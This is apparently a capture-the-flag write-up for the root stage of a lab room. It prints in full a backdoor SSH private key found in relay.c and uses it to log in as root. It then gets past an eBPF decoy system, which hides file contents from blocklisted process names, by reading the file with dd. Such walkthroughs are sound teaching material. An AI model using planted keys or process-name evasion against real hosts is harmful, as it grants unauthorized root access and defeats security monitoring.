### Summary

The `quiet-relay` source, recovered during the user stage, embeds an ed25519 private key labelled `quiet-relay-backdoor` whose public half is in root's `authorized_keys`, so the key logs in directly as root. `/root/root.txt` is then hidden by a custom eBPF suite: an LSM `file_open` hook and an `fexit` hook on `vfs_read` replace protected file contents with decoys from a BPF map, but only when the reading process's `comm` is on a hard-coded blocklist (`cat`, `grep`, `xxd`, `head`, ...). Reading the file with a tool that is not on that list, such as `dd`, returns the real bytes.

Target was volatile: `TARGET=10.49.182.79` (THM room `isfcr2`). This stage builds on the user foothold in `quite-user`.

### Steps

1. Log in as root with the backdoor key from `quiet-relay`. The key was taken from `/opt/quiet-relay/relay.c` (the copy exfiltrated in the user stage). It is saved as `artifacts/maint_key` (mode 600 is required by ssh).
   ```text
   -----BEGIN OPENSSH PRIVATE KEY-----
   b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
   QyNTUxOQAAACAwFQOSThBp52VQ8KAx3aZCzv+Q+i7svRTvXHUwye4jAgAAAJhAQuf8QELn
   /AAAAAtzc2gtZWQyNTUxOQAAACAwFQOSThBp52VQ8KAx3aZCzv+Q+i7svRTvXHUwye4jAg
   AAAEDAAU9omf8MNonUG0P3DYt08xDR5Ljg69ppHHg454bMIjAVA5JOEGnnZVDwoDHdpkLO
   /5D6Luy9FO9cdTDJ7iMCAAAAFHF1aWV0LXJlbGF5LWJhY2tkb29yAQ==
   -----END OPENSSH PRIVATE KEY-----
   ```
   ```sh
   chmod 600 artifacts/maint_key
   ssh -i artifacts/maint_key root@10.49.182.79 id
   # uid=0(root)
   ```
   The same key is rejected for `thm-admin`, `debian`, `relay` and `app`. It only works for root.

2. `cat /root/root.txt` returns a decoy (`isfcr{n0t_th15_0ne_k33p_l00k1ng}`). Enumerate the eBPF programs and maps to see why.
   ```sh
   bpftool prog list        # quiet_lsm_file_open, quiet_lsm_file_free, quiet_fexit_vfs_read
   bpftool map dump id 3    # "decoys": fake root.txt, /etc/shadow, relay.c, ...
   bpftool map dump id 5    # ".rodata": blocklist of reader comms
   ```
   The `quiet-loader.service` loads the suite. The LSM hooks tag protected inodes (`tagged_files`). The `fexit/vfs_read` program overwrites the read buffer with the decoy when the opened file is tagged and the reader's `comm` is one of:
   `cat ls stat grep head tail less more find wc file xxd md5sum sha256sum vim nano nm`.

3. Read the flag with a program that is not on the blocklist. `dd` works because its `comm` is `dd`:
   ```sh
   ssh -i artifacts/maint_key root@10.49.182.79 'dd if=/root/root.txt 2>/dev/null'
   # isfcr{REDACTED}
   ```
   The same run is packaged as `scripts/read_root_flag.sh`, which is streamed to the root shell:
   ```sh
   ssh -i artifacts/maint_key root@10.49.182.79 'sh -s' < scripts/read_root_flag.sh
   ```

### Scripts

#### scripts/read_root_flag.sh

Reads `/root/root.txt` with `dd`, so the eBPF decoy does not apply. Run it by streaming it to a root shell over SSH, as shown in step 3.

```sh
#!/bin/sh
# Read the real root flag, bypassing the quiet eBPF LSM decoy (which swaps file
# contents only when the reader's comm is in its blocklist: cat/ls/grep/head/
# xxd/... ). dd is not in that list, so it returns the true on-disk bytes.
# Usage: ssh -i artifacts/maint_key root@TARGET 'sh -s' < scripts/read_root_flag.sh
dd if=/root/root.txt 2>/dev/null
```

### Notes

- `cat`, `grep`, `xxd` and `stat` all return fakes. The size reported by `stat` is also a decoy, so do not trust the file size. Dumping the raw block devices with `grep` finds nothing, because `grep` itself is on the blocklist. Read the file directly with `dd`.
- The decoy map also serves a sanitized `relay.c` (no backdoor key, strict `exec_hook` peer check), a fake `/etc/shadow`, and hint strings such as `isfcr{c4t_1s_ly1ng_r34d_th3_b1t5_y0ur53lf!!}`. These are decoys, not the flag.
- The flag text itself points at the intended bypass: a reader whose `comm` is not blocklisted. A renamed `objdump` also works.
- The backdoor key is a credential that belongs to this box, not the flag. It is kept in the write-up because the root login depends on it.
